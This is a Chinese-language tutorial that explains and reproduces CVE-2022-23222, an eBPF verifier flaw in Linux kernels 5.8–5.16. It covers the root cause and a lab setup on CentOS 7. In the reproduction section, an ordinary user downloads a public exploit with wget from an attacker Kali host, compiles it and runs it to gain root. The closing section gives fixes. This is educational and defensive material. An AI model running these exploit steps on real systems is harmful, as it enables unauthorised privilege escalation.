[TOC]



# ==Linux下eBPF提权==

教材内容

# Linux Kernel eBPF权限提升漏洞复现

### 一、漏洞简介

 2022年1月14日，CVE-2022-23222漏洞被公开，这是一个位于eBPF验证器中的漏洞，该漏洞允许eBPF程序在未经验证的情况下对特定指针进行运算，通过精心构造的代码，可以实现任意内核内存读写，从而进行本地提权。

影响版本：5.8 ≤ Linux Kernel ≤ 5.16（Linux Kernel 5.10.92， 5.15.15， 5.16.1 版本不受影响）

### 二、漏洞成因

 eBPF 源于 BPF，本质上是处于内核中的一个高效与灵活的虚类虚拟机组件，以一种安全的方式在许多内核 hook 点执行字节码。BPF 最初的目的是用于高效网络报文过滤，经过重新设计，eBPF 不再局限于网络协议栈，已经成为内核顶级的子系统，已经成为了一个通用执行引擎。开发者可基于 eBPF 开发性能分析工具、软件定义网络等诸多场景。

 前面简单介绍了EBPF是以一种安全的方式在内核中执行字节码，所以在实际场景中eBPF程序会编译为eBPF字节码，而eBPF字节码需要通过eBPF Verifier的(静态)验证后，才能运行。边界检查是eBPF Verifier的重点工作，目的是为了防止eBPF程序内存越界访问。而本次漏洞的利用点就是在eBPF verifier的adjust_ptr_min_max_vals()函数，该函数用于检验指针加减运算。部分代码如下：

```
* C *-----------------------------------------------------------------------------------------/* Handles arithmetic on a pointer and a scalar: computes new min/max and var_off. * Caller should also handle BPF_MOV case separately. * If we return -EACCES, caller may want to try again treating pointer as a * scalar.  So we only emit a diagnostic if !env->allow_ptr_leaks. */static int adjust_ptr_min_max_vals(struct bpf_verifier_env *env,                   struct bpf_insn *insn,                   const struct bpf_reg_state *ptr_reg,                   const struct bpf_reg_state *off_reg){...    switch (ptr_reg->type) {    case PTR_TO_MAP_VALUE_OR_NULL:        verbose(env, "R%d pointer arithmetic on %s prohibited, null-check it first\n",            dst, reg_type_str[ptr_reg->type]);        return -EACCES;    case CONST_PTR_TO_MAP:        /* smin_val represents the known value */        if (known && smin_val == 0 && opcode == BPF_ADD)            break;        fallthrough;    case PTR_TO_PACKET_END:    case PTR_TO_SOCKET:    case PTR_TO_SOCKET_OR_NULL:    case PTR_TO_SOCK_COMMON:    case PTR_TO_SOCK_COMMON_OR_NULL:    case PTR_TO_TCP_SOCK:    case PTR_TO_TCP_SOCK_OR_NULL:    case PTR_TO_XDP_SOCK:        verbose(env, "R%d pointer arithmetic on %s prohibited\n",            dst, reg_type_str[ptr_reg->type]);        return -EACCES;    default:        break;    }...    return 0;}
```

 其中的switch分支用于过滤不支持加减运算的指针类型，比如各种OR_NULL类型。但是这个switch分支却少了很多类型的判断，如PTR_TO_MEM_OR_NULL, PTR_TO_RDONLY_BUF_OR_NULL, PTR_TO_RDWR_BUF_OR_NULL等。于是可以对这些少了的类型做加减运算，获得空指针并利用，最终实现指针地址泄漏和任意地址读写。

 此漏洞本质上是eBPF验证器过滤不严，导致验证器的逻辑与实际执行时不一致，从而突破了验证器的安全检查，并最终导致内核任意内存读写。

### 三、漏洞复现

#### 3.1 漏洞环境

操作系统：Centos7（带gcc）

 内核版本：5.8.7

 用户：zhangsan （普通用户）

 漏洞利用工具：https://github.com/tr3ee/CVE-2022-23222

##### 3.1.1 centos7 安装指定版本内核（5.8.7）

VMware安装Centos7，系统镜像为CentOS-7-x86_64-Minimal-2009.iso（https://mirrors.tuna.tsinghua.edu.cn/centos/7.9.2009/isos/x86_64/CentOS-7-x86_64-Minimal-2009.iso）

使用rpm包安装5.8.7版本的内核，步骤如下：

1.下载以下rpm包。

rpm资源网站：https://dl.lamp.sh/kernel/el7/

```
wget https://dl.lamp.sh/kernel/el7/kernel-ml-5.8.7-1.el7.elrepo.x86_64.rpmwget https://dl.lamp.sh/kernel/el7/kernel-ml-devel-5.8.7-1.el7.elrepo.x86_64.rpmwget https://dl.lamp.sh/kernel/el7/kernel-ml-headers-5.8.7-1.el7.elrepo.x86_64.rpmwget https://dl.lamp.sh/kernel/el7/kernel-ml-tools-5.8.7-1.el7.elrepo.x86_64.rpmwget https://dl.lamp.sh/kernel/el7/kernel-ml-tools-libs-devel-5.8.7-1.el7.elrepo.x86_64.rpm
```

2.安装上述rpm包。

```
rpm -ivh kernel-ml-5.8.7-1.el7.elrepo.x86_64.rpmrpm -ivh kernel-ml-devel-5.8.7-1.el7.elrepo.x86_64.rpmrpm -ivh kernel-ml-headers-5.8.7-1.el7.elrepo.x86_64.rpmrpm -ivh kernel-ml-tools-* --nodeps --force
```

3.查看启动顺序。

```
awk -F\' '$1=="menuentry " {print $2}' /etc/grub2.cfg
```

![image-20220818152039380](https://gitee.com/ymq_typroa/typroa/raw/main/20220818152039.png)

4.设置启动顺序，根据上一步的查询结果。

```
grub2-set-default 0
```

5.重启主机，而后使用 “uname -a” 命令查看当前系统内核版本信息。

![image-20220818152401578](https://gitee.com/ymq_typroa/typroa/raw/main/20220818152401.png)

6.创建普通用户zhangsan

```
useradd zhangsanpasswd zhangsan  # 设置用户密码
```

7.使用 zhangsan 登录系统。

#### 3.2 复现过程

1. 获取漏洞利用工具，此处在kali上使用python开启web服务器，并让被攻击主机下载提权工具源码。

   ```
    wget http://192.168.219.134:8000/CVE-2022-23222-master.zip
   ```

2. 解压，编译，安装。

   ```
    unzip CVE-2022-23222-master.zip cd CVE-2022-23222-master make
   ```

3. 进行提权。

   ```
    ./expolit
   ```

![image-20220818151222511](https://gitee.com/ymq_typroa/typroa/raw/main/20220818151229.png)

### 四、漏洞修复

1. 非root用户禁止调用ebpf。

   ```
    echo 1 > /proc/sys/kernel/unprivileged_bpf_disabled
   ```

   - 值为0表示允许非特权用户调用bpf。
   - 值为1表示禁止非特权用户调用bpf且该值不可再修改，只能重启内核后修改。
   - 值为2表示禁止非特权用户调用bpf，可以再次修改为0或1。

2. 更新系统内核为已修复该漏洞的版本。

### 五、参考文章

1. CVE-2022-23222-linux内核提权漏洞（https://segmentfault.com/a/1190000042038200）。
2. 万字干货，eBPF 中文入门指南（https://www.modb.pro/db/391570）。
3. Linux Tracing System浅析和eBPF开发经验分享（https://it.sohu.com/a/551882111_121124374）。
4. CVE-2022-23222漏洞及利用分析（http://cn-sec.com/archives/1137501.html）。